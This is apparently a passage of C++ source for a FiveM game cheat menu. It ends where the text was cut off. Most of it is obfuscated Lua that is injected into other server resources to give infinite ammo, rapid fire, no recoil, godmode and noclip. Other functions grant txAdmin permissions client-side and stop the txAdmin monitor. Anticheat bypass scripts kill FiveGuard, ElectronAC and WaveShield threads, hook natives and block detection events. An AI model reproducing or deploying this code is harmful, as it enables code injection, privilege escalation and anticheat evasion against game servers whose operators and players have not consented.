                    if _G.SouthInfStamina == nil then _G.SouthInfStamina = false end
                    _G.SouthInfStamina = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local pid_fn = _g({80,108,97,121,101,114,73,100})
                        local restore_fn = _g({82,101,115,116,111,114,101,80,108,97,121,101,114,83,116,97,109,105,110,97})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthInfStamina do
                            restore_fn(pid_fn(), 1.0)
                            wait_fn(0)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + (isWS ? target : "any") + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"any\", [[ _G.SouthInfStamina = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleTinyPed(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end
                    _g({83,101,116,80,101,100,67,111,110,102,105,103,70,108,97,103})(_g({80,108,97,121,101,114,80,101,100,73,100})(), 223, true)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end
                    _g({83,101,116,80,101,100,67,111,110,102,105,103,70,108,97,103})(_g({80,108,97,121,101,114,80,101,100,73,100})(), 223, false)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleSuperPunch(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local _hook = _G[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})] or (_ENV and _ENV[_d({77,97,99,104,111,72,111,111,107,78,97,116,105,118,101})])
                    if _hook then
                        _hook("CreateThread", function(o, ...) return o(...) end)
                        _G[_d({87,97,105,116})] = function(n) return _g({87,97,105,116})(n) end
                    end

                    if _G.SouthSuperPunch == nil then _G.SouthSuperPunch = false end
                    _G.SouthSuperPunch = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                local ok, err = coroutine.resume(co)
                                if not ok then break end
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local setMeleeMod = _g({83,101,116,80,108,97,121,101,114,77,101,108,101,101,87,101,97,112,111,110,68,97,109,97,103,101,77,111,100,105,102,105,101,114})
                        local setVehicleMod = _g({83,101,116,80,108,97,121,101,114,86,101,104,105,99,108,101,68,97,109,97,103,101,77,111,100,105,102,105,101,114})
                        local setWeaponMod = _g({83,101,116,87,101,97,112,111,110,68,97,109,97,103,101,77,111,100,105,102,105,101,114})
                        local playerId = _g({80,108,97,121,101,114,73,100})
                        local getHash = _g({71,101,116,72,97,115,104,75,101,121})
                        local unarmedHash = getHash("WEAPON_UNARMED")
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthSuperPunch do
                            local pid = playerId()
                            setMeleeMod(pid, 150.0)
                            setVehicleMod(pid, 150.0)
                            setWeaponMod(unarmedHash, 150.0)
                            wait_fn(0)
                        end

                        local pid = playerId()
                        setMeleeMod(pid, 1.0)
                        setVehicleMod(pid, 1.0)
                        setWeaponMod(unarmedHash, 1.0)
                    end)
                )lua";
                std::string fullCode = "local isWS = " + std::string(isWS ? "true" : "false") + "\n" + code;
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + fullCode + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthSuperPunch = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleInfiniteAmmo(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthInfAmmo == nil then _G.SouthInfAmmo = false end
                    _G.SouthInfAmmo = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local playerPedId = _g({80,108,97,121,101,114,80,101,100,73,100})
                        local setPedInfiniteAmmoClip = _g({83,101,116,80,101,100,73,110,102,105,110,105,116,101,65,109,109,111,67,108,105,112})
                        local getSelectedPedWeapon = _g({71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110})
                        local getAmmoInPedWeapon = _g({71,101,116,65,109,109,111,73,110,80,101,100,87,101,97,112,111,110})
                        local setPedAmmo = _g({83,101,116,80,101,100,65,109,109,111})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthInfAmmo do
                            local ped = playerPedId()
                            if ped and ped ~= 0 then
                                local weapon = getSelectedPedWeapon(ped)
                                setPedInfiniteAmmoClip(ped, true)
                                if getAmmoInPedWeapon(ped, weapon) <= 0 then
                                    setPedAmmo(ped, weapon, 250)
                                end
                            end
                            wait_fn(0)
                        end
                        local ped = playerPedId()
                        if ped and ped ~= 0 then
                            setPedInfiniteAmmoClip(ped, false)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthInfAmmo = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleRapidFire(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthRapidFire == nil then _G.SouthRapidFire = false end
                    _G.SouthRapidFire = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local playerPedId = _g({80,108,97,121,101,114,80,101,100,73,100})
                        local isPlayerShooting = _g({73,115,80,108,97,121,101,114,83,104,111,111,116,105,110,103})
                        local setAttackSpeed = _g({83,101,116,80,108,97,121,101,114,87,101,97,112,111,110,65,116,116,97,99,107,83,112,101,101,100})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthRapidFire do
                            local ped = playerPedId()
                            if ped and ped ~= 0 then
                                if isPlayerShooting(ped) then
                                    setAttackSpeed(ped, 1000.0)
                                end
                            end
                            wait_fn(0)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthRapidFire = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleNoRecoil(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthNoRecoil == nil then _G.SouthNoRecoil = false end
                    _G.SouthNoRecoil = true

                    local function initFlow(cb)
                        local co = coroutine.create(cb)
                        local wait_fn = _g({87,97,105,116})
                        _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                            while coroutine.status(co) ~= "dead" do
                                coroutine.resume(co)
                                wait_fn(0)
                            end
                        end)
                    end

                    initFlow(function()
                        local playerPedId = _g({80,108,97,121,101,114,80,101,100,73,100})
                        local isPlayerShooting = _g({73,115,80,108,97,121,101,114,83,104,111,111,116,105,110,103})
                        local getSelectedPedWeapon = _g({71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110})
                        local setWeaponRecoil = _g({83,101,116,87,101,97,112,111,110,82,101,99,111,105,108})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthNoRecoil do
                            local ped = playerPedId()
                            if ped and ped ~= 0 then
                                if isPlayerShooting(ped) then
                                    local weapon = getSelectedPedWeapon(ped)
                                    setWeaponRecoil(ped, weapon, 0.0)
                                end
                            end
                            wait_fn(0)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthNoRecoil = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleNoSpread(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            if (state) {
                std::string code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    if _G.SouthNoSpread == nil then _G.SouthNoSpread = false end
                    _G.SouthNoSpread = true

                    _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                        local ped_fn = _g({80,108,97,121,101,114,80,101,100,73,100})
                        local getWep = _g({71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110})
                        local setAcc = _g({83,101,116,65,99,99,117,114,97,99,121,77,111,100,105,102,105,101,114})
                        local wait_fn = _g({87,97,105,116})

                        while _G.SouthNoSpread do
                            local p = ped_fn()
                            if p and p ~= 0 then
                                local weapon = getWep(p)
                                setAcc(weapon, 1000.0)
                            end
                            wait_fn(0)
                        end
                    end)
                )lua";
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[ _G.SouthNoSpread = false ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleTxAdminNoclip(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            if (state) {
                ::ProcessMachoCommands("MachoInjectResource(\"hardcap\", [[ TriggerEvent(\"txcl:setPlayerMode\", \"noclip\", true) ]])", resources);
            } else {
                ::ProcessMachoCommands("MachoInjectResource(\"hardcap\", [[ TriggerEvent(\"txcl:setPlayerMode\", \"none\", true) ]])", resources);
            }
        } catch (...) {}
    }

    static void ToggleDisableTxAdmin(bool state) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            if (state) {
                ::ProcessMachoCommands("MachoResourceStop(\"monitor\")", resources);
            } else {
                ::ProcessMachoCommands("MachoResourceStart(\"monitor\")", resources);
            }
        } catch (...) {}
    }

    static inline std::string getTxAdminScript(bool riskMode) {
        if (!riskMode) {
            return R"lua(
    local function giveTXAdmin()
        local resourceState = GetResourceState("monitor")
        if resourceState == "started" then
            Citizen.CreateThread(function()
                Citizen.Wait(math.random(500, 1500))
                local pName = GetPlayerName(PlayerId()) or "Admin"
                TriggerEvent("txcl:setAdmin", pName, {"all_permissions"}, "")
            end)
        end
    end
    giveTXAdmin()
    )lua";
        } else {
            return R"lua(
    local function giveTXAdmin()
        TriggerEvent("txcl:setAdmin", "Sus", {"all_permissions"}, "")
        if ShowNotification then 
            ShowNotification("TX Admin", "Admin privileges granted", "success", 2000) 
        end
    end
    if miscMenu then
        miscMenu:AddButton("Give TX Admin (Client-Side)", function()
            giveTXAdmin()
        end)
    end
    giveTXAdmin()

    local txMenuOpen = false
    local currentBaris = 1 
    local wasNuiFocused = false
    local currentMode = 1 
    local modeNames = {"Normal", "Noclip", "Godmode", "Super Jump"}
    local currentLain = 0 
    local lainNames = {"TP Waypoint", "TP Coords", "Teleport Back", "Copy Coords"}
    local modeStatus = {
        noclip = false,
        godmode = false,
        superjump = false
    }
    local function resetAllModes()
        if modeStatus.noclip then
            TriggerEvent("txcl:setPlayerMode", "none", true)
            modeStatus.noclip = false
        end
        if modeStatus.godmode then
            local ped = PlayerPedId()
            SetEntityCanBeDamaged(ped, true)
            SetEntityProofs(ped, false, false, false, false, false, false, false, false)
            SetEntityInvincible(ped, false)
            modeStatus.godmode = false
        end
        if modeStatus.superjump then
            _G.superJumpEnabled = false
            modeStatus.superjump = false
        end
        TriggerEvent("txcl:setPlayerMode", "none", true)
    end
    local function setNoclip(enabled)
        if enabled then
            if not modeStatus.noclip then
                if modeStatus.godmode then
                    local ped = PlayerPedId()
                    SetEntityCanBeDamaged(ped, true)
                    SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                    SetEntityInvincible(ped, false)
                    modeStatus.godmode = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Godmode disabled", "info", 1500) 
                    end
                end
                if modeStatus.superjump then
                    _G.superJumpEnabled = false
                    modeStatus.superjump = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Super Jump disabled", "info", 1500) 
                    end
                end
                TriggerEvent("txcl:setPlayerMode", "noclip", true)
                modeStatus.noclip = true
                if ShowNotification then 
                    ShowNotification("TX Admin", "Noclip enabled", "success", 2000) 
                end
            else
                if ShowNotification then 
                    ShowNotification("TX Admin", "Noclip already enabled", "info", 1500) 
                end
            end
        else
            if modeStatus.noclip then
                TriggerEvent("txcl:setPlayerMode", "none", true)
                modeStatus.noclip = false
                if ShowNotification then 
                    ShowNotification("TX Admin", "Noclip disabled", "info", 2000) 
                end
            end
        end
    end
    local function setGodmode(enabled)
        local ped = PlayerPedId()
        if enabled then
            TriggerEvent("txcl:setPlayerMode", "none", true)
            if not modeStatus.godmode then
                if modeStatus.noclip then
                    TriggerEvent("txcl:setPlayerMode", "none", true)
                    modeStatus.noclip = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Noclip disabled", "info", 1500) 
                    end
                end
                if modeStatus.superjump then
                    _G.superJumpEnabled = false
                    modeStatus.superjump = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Super Jump disabled", "info", 1500) 
                    end
                end
                SetEntityCanBeDamaged(ped, false)
                SetEntityProofs(ped, true, true, true, true, true, true, false, true)
                SetEntityInvincible(ped, true)
                modeStatus.godmode = true
                if ShowNotification then 
                    ShowNotification("TX Admin", "Godmode enabled", "success", 2000) 
                end
            else
                if ShowNotification then 
                    ShowNotification("TX Admin", "Godmode already enabled", "info", 1500) 
                end
            end
        else
            if modeStatus.godmode then
                SetEntityCanBeDamaged(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                SetEntityInvincible(ped, false)
                modeStatus.godmode = false
                TriggerEvent("txcl:setPlayerMode", "none", true)
                if ShowNotification then 
                    ShowNotification("TX Admin", "Godmode disabled", "info", 2000) 
                end
            end
        end
    end
    local function setSuperJump(enabled)
        if enabled then
            TriggerEvent("txcl:setPlayerMode", "none", true)
            if not modeStatus.superjump then
                if modeStatus.noclip then
                    TriggerEvent("txcl:setPlayerMode", "none", true)
                    modeStatus.noclip = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Noclip disabled", "info", 1500) 
                    end
                end
                if modeStatus.godmode then
                    local ped = PlayerPedId()
                    SetEntityCanBeDamaged(ped, true)
                    SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                    SetEntityInvincible(ped, false)
                    modeStatus.godmode = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Godmode disabled", "info", 1500) 
                    end
                end
                if not _G.superJumpEnabled then
                    _G.superJumpEnabled = true
                    Citizen.CreateThread(function()
                        while _G.superJumpEnabled do
                            SetSuperJumpThisFrame(PlayerId())
                            Citizen.Wait(0)
                        end
                    end)
                end
                modeStatus.superjump = true
                if ShowNotification then 
                    ShowNotification("TX Admin", "Super Jump enabled", "success", 2000) 
                end
            else
                if ShowNotification then 
                    ShowNotification("TX Admin", "Super Jump already enabled", "info", 1500) 
                end
            end
        else
            if modeStatus.superjump then
                _G.superJumpEnabled = false
                modeStatus.superjump = false
                TriggerEvent("txcl:setPlayerMode", "none", true)
                if ShowNotification then 
                    ShowNotification("TX Admin", "Super Jump disabled", "info", 2000) 
                end
            end
        end
    end
    local function tpWaypoint()
        local blip = GetFirstBlipInfoId(8)
        if DoesBlipExist(blip) then
            local coords = GetBlipInfoIdCoords(blip)
            local p = PlayerPedId()
            local wasVisible = IsEntityVisible(p)
            SetEntityVisible(p, false, false)
            SetEntityInvincible(p, true)
            SetEntityCollision(p, false, false)
            FreezeEntityPosition(p, true)

            local targetX, targetY, targetZ = coords.x, coords.y, coords.z
            local groundFound = false
            local groundZ = 0.0

            for height = 1000.0, 0.0, -100.0 do
                SetEntityCoordsNoOffset(p, targetX, targetY, height, true, true, true)
                Wait(0)
                local found, z = GetGroundZFor_3dCoord(targetX, targetY, height, false)
                if found then
                    groundZ = z
                    groundFound = true
                    break
                end
            end

            if not groundFound then
                groundZ = 500.0
            end

            SetEntityCoordsNoOffset(p, targetX, targetY, groundZ + 2.0, true, true, true)
            Wait(250)

            if not groundFound then
                local found, z = GetGroundZFor_3dCoord(targetX, targetY, 999.0, false)
                if found then
                    SetEntityCoordsNoOffset(p, targetX, targetY, z + 2.0, true, true, true)
                end
            end

            FreezeEntityPosition(p, false)
            SetEntityCollision(p, true, true)
            SetEntityInvincible(p, false)
            SetEntityVisible(p, wasVisible, false)

            if ShowNotification then 
                ShowNotification("TX Admin", "Teleporting to waypoint", "success", 1500) 
            end
        else
            if ShowNotification then 
                ShowNotification("TX Admin", "No waypoint set", "error", 1500) 
            end
        end
    end
    local function tpCoords()
        if ShowNotification then 
            ShowNotification("TX Admin", "TP Coords (coming soon)", "info", 1500) 
        end
    end
    local lastCoords = nil
    local function teleportBack()
        if lastCoords then
            local p = PlayerPedId()
            local wasVisible = IsEntityVisible(p)
            SetEntityVisible(p, false, false)
            SetEntityInvincible(p, true)
            SetEntityCollision(p, false, false)
            FreezeEntityPosition(p, true)
            SetEntityCoordsNoOffset(p, lastCoords.x, lastCoords.y, lastCoords.z, true, true, true)
            Wait(250)
            FreezeEntityPosition(p, false)
            SetEntityCollision(p, true, true)
            SetEntityInvincible(p, false)
            SetEntityVisible(p, wasVisible, false)
            if ShowNotification then 
                ShowNotification("TX Admin", "Teleported back", "success", 1500) 
            end
        else
            if ShowNotification then 
                ShowNotification("TX Admin", "No last position saved", "error", 1500) 
            end
        end
    end
    local function copyCoords()
        if ShowNotification then 
            ShowNotification("TX Admin", "Copy Coords (coming soon)", "info", 1500) 
        end
    end
    local function tpWaypointWithSave()
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        lastCoords = {x = coords.x, y = coords.y, z = coords.z}
        tpWaypoint()
    end
    local function toggleCurrentSelection()
        if currentBaris == 1 then 
            if currentMode == 0 then 
                resetAllModes()
                if ShowNotification then 
                    ShowNotification("TX Admin", "Normal mode - All disabled", "info", 2000) 
                end
            elseif currentMode == 1 then 
                if modeStatus.noclip then
                    setNoclip(false)
                else
                    setNoclip(true)
                end
            elseif currentMode == 2 then 
                if modeStatus.godmode then
                    setGodmode(false)
                else
                    setGodmode(true)
                end
            elseif currentMode == 3 then 
                if modeStatus.superjump then
                    setSuperJump(false)
                else
                    setSuperJump(true)
                end
            end
        else 
            if currentLain == 0 then 
                tpWaypointWithSave()
            elseif currentLain == 1 then 
                tpCoords()
            elseif currentLain == 2 then 
                teleportBack()
            elseif currentLain == 3 then 
                copyCoords()
            end
        end
    end
    local function getModeStatus(modeIdx)
        if modeIdx == 0 then
            return not (modeStatus.noclip or modeStatus.godmode or modeStatus.superjump) and "ON" or "OFF"
        elseif modeIdx == 1 then
            return modeStatus.noclip and "ON" or "OFF"
        elseif modeIdx == 2 then
            return modeStatus.godmode and "ON" or "OFF"
        elseif modeIdx == 3 then
            return modeStatus.superjump and "ON" or "OFF"
        end
        return "OFF"
    end
    local function handleTXMenuKeybinds()
        Citizen.CreateThread(function()
            while txMenuOpen do
                Citizen.Wait(0)
                if IsControlJustPressed(0, 173) or IsControlJustPressed(0, 172) then 
                    if currentBaris == 1 then
                        currentBaris = 2
                        if ShowNotification then 
                            ShowNotification("TX Admin", "Lain Menu: " .. lainNames[currentLain + 1], "info", 1500) 
                        end
                    else
                        currentBaris = 1
                        if ShowNotification then 
                            ShowNotification("TX Admin", "Mode Menu: " .. modeNames[currentMode + 1] .. " [" .. getModeStatus(currentMode) .. "]",)lua" R"lua( "info", 1500) 
                        end
                    end
                    Citizen.Wait(200)
                end
                if IsControlJustPressed(0, 175) then
                    if currentBaris == 1 then
                        currentMode = currentMode + 1
                        if currentMode > 3 then currentMode = 0 end
                        if ShowNotification then 
                            ShowNotification("TX Admin", "Mode: " .. modeNames[currentMode + 1] .. " [" .. getModeStatus(currentMode) .. "]", "info", 1500) 
                        end
                    else
                        currentLain = currentLain + 1
                        if currentLain > 3 then currentLain = 0 end
                        if ShowNotification then 
                            ShowNotification("TX Admin", "Lain: " .. lainNames[currentLain + 1], "info", 1500) 
                        end
                    end
                    Citizen.Wait(200)
                end
                if IsControlJustPressed(0, 174) then
                    if currentBaris == 1 then
                        currentMode = currentMode - 1
                        if currentMode < 0 then currentMode = 3 end
                        if ShowNotification then 
                            ShowNotification("TX Admin", "Mode: " .. modeNames[currentMode + 1] .. " [" .. getModeStatus(currentMode) .. "]", "info", 1500) 
                        end
                    else
                        currentLain = currentLain - 1
                        if currentLain < 0 then currentLain = 3 end
                        if ShowNotification then 
                            ShowNotification("TX Admin", "Lain: " .. lainNames[currentLain + 1], "info", 1500) 
                        end
                    end
                    Citizen.Wait(200)
                end
                if IsControlJustPressed(0, 191) then
                    toggleCurrentSelection()
                    Citizen.Wait(200)
                end
                if IsControlJustPressed(0, 194) or IsControlJustPressed(0, 177) then
                    txMenuOpen = false
                    if ShowNotification then 
                        ShowNotification("TX Admin", "Menu closed", "info", 1500) 
                    end
                    Citizen.Wait(200)
                end
            end
        end)
    end
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(50)
            local isNuiFocused = IsNuiFocused()
            if isNuiFocused and not wasNuiFocused then
                txMenuOpen = true
                currentBaris = 1
                currentMode = 1
                currentLain = 0
                handleTXMenuKeybinds()
                local statusText = string.format("N:%s G:%s S:%s", 
                    modeStatus.noclip and "ON" or "OFF",
                    modeStatus.godmode and "ON" or "OFF",
                    modeStatus.superjump and "ON" or "OFF")
                if ShowNotification then 
                    ShowNotification("TX Admin", "Menu - " .. statusText .. " | PANAH BAWAH ganti baris", "info", 3000) 
                end
            elseif not isNuiFocused and wasNuiFocused then
                txMenuOpen = false
            end
            wasNuiFocused = isNuiFocused
        end
    end)
    Citizen.CreateThread(function()
        while true do
            Citizen.Wait(100)
            if IsControlJustPressed(0, 244) then
                TriggerEvent("txcl:openMainMenu")
                Citizen.Wait(100)
                txMenuOpen = true
                currentBaris = 1
                currentMode = 1
                currentLain = 0
                handleTXMenuKeybinds()
                local statusText = string.format("N:%s G:%s S:%s", 
                    modeStatus.noclip and "ON" or "OFF",
                    modeStatus.godmode and "ON" or "OFF",
                    modeStatus.superjump and "ON" or "OFF")
                if ShowNotification then 
                    ShowNotification("TX Admin", "Menu - " .. statusText .. " | PANAH BAWAH ganti baris", "info", 3000) 
                end
                Citizen.Wait(500)
            end
        end
    end)
    )lua";
        }
    }

    static bool ExecuteTxAdmin(const std::string& type) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl();
            if (rm) {
                auto resources = rm->getAllResources();
                std::string target = "hardcap";
                bool risk = (type == "Risk");
                ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + getTxAdminScript(risk) + "]])", resources);
                return true;
            }
        } catch (...) {}
        return false;
    }

        static std::string getAnticheatBypassScript() {
            return R"lua(
    do
    local anticheat = {
        FiveGuard = "FiveGuard",
        ElectronAC = "ElectronAC",
        WaveShield = "WaveShield",
        EagleAC = "EC_AC",
        ReaperV4 = "ReaperV4",
        ReasonAC = "RAC"
    }

    local function inject_bypass(resource, code)
        if GetResourceState(resource) == "started" then
            MachoInjectResource(resource, code)
        end
    end

    local fiveguard_code = [[
        local f = function() end
        local t = function() return true end
        local g = _G
        local s = string
        local function h(n)
            return g[s.char(71,101,116,72,97,115,104,75,101,121)](n)
        end
        local natives = {
            h("GetSelectedPedWeapon"), h("HasPedGotWeapon"), h("GetAmmoInPedWeapon"),
            h("GetWeaponClipSize"), h("GetMaxAmmo"), h("GiveWeaponToPed"),
            h("SetCurrentPedWeapon"), h("RemoveWeaponFromPed"), h("RemoveAllPedWeapons")
        }
        local orig = Citizen.InvokeNative
        Citizen.InvokeNative = function(native, ...)
            for _, n in ipairs(natives) do
                if native == n then return f end
            end
            return orig(native, ...)
        end
        local evs = { "FiveGuard:detection", "FiveGuard:ban", "FiveGuard:kick" }
        for _, ev in ipairs(evs) do
            if g.AddEventHandler then g.AddEventHandler(ev, f) end
        end
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and s.find(info.source, "FiveGuard") then
                    coroutine.close(co)
                end
            end
        end
    ]]

    local electron_code = [[
        local g = _G
        local s = string
        local t = function() return true end
        local n = function() end

        local function clean_threads()
            local registry = debug.getregistry()
            local threads = registry._threads
            if threads then
                for i = #threads, 1, -1 do
                    local co = threads[i]
                    local info = debug.getinfo(co)
                    if info and info.source and (s.find(info.source, "Electron") or s.find(info.source, "AC")) then
                        coroutine.close(co)
                    end
                end
            end
        end
        clean_threads()

        local function wipe_handlers()
            local registry = debug.getregistry()
            local handlers = registry._eventHandlers
            if handlers then
                for ev, tbl in pairs(handlers) do
                    if type(tbl) == "table" and (s.find(ev, "Electron") or s.find(ev, "AC")) then
                        for i = #tbl, 1, -1 do
                            local h = tbl[i]
                            if type(h) == "function" then
                                local info = debug.getinfo(h)
                                if info and info.source and (s.find(info.source, "Electron") or s.find(info.source, "AC")) then
                                    table.remove(tbl, i)
                                end
                            end
                        end
                    end
                end
            end
        end
        wipe_handlers()

        local function block_event(e, ...)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end
        g.TriggerEvent = block_event

        local ts = g.TriggerServerEvent
        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC")) then
                return
            end
            return ts(e, ...)
        end

        local ra = g.RegisterNetEvent
        g.RegisterNetEvent = function(e)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC")) then
                return
            end
            return ra(e)
        end

        local ah = g.AddEventHandler
        g.AddEventHandler = function(e, cb)
            if type(e) == "string" and (s.find(e, "Electron") or s.find(e, "AC")) then
                return
            end
            return ah(e, cb)
        end

        local natives = {
            [0x3A87E44BB9A01D54] = true,
            [0x8DECB02F88F428BC] = true,
            [0x015A522136D7F951] = true,
            [0xA38DCFFCE89696FA] = true,
            [0x475768A975D5AD17] = true,
            [0xF25DF915FA38C5F3] = true,
            [0x4899CB088EDF3BCC] = true,
            [0x0A6DB4965674D243] = true,
            [0xC3287EE3050FB74C] = true,
            [0x8483E98E8B888A2D] = true,
        }
        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(hash, ...)
            if natives[hash] then return false end
            return invoke(hash, ...)
        end

        local state = LocalPlayer.state
        for k, v in pairs(state) do
            if type(v) == "function" and (s.find(k, "electron") or s.find(k, "ac")) then
                state[k] = n
            end
        end

        local function kill_globals()
            local bad = { "ElectronAC", "Electron", "AC_Start", "AC_Detect", "ElectronDetect" }
            for _, name in ipairs(bad) do
                g[name] = nil
            end
        end
        kill_globals()
    ]]

    local waveshield_code = [[
        local g = _G
        local s = string
        local function kill()
            local thr = debug.getregistry()._threads
            if thr then
                for i = #thr, 1, -1 do
                    local co = thr[i]
                    local info = debug.getinfo(co)
                    if info and info.source and (s.find(info.source, "WaveShield") or s.find(info.source, "ws")) then
                        coroutine.close(co)
                    end
                end
            end
        end
        kill()
        local function nop() end
        local function block_event(e, ...)
            if type(e) == "string" and (e:find("WaveShield") or e:find("WS_") or e:find("shield")) then
                return
            end
            return TriggerEvent(e, ...)
        end
        _G.TriggerEvent = block_event
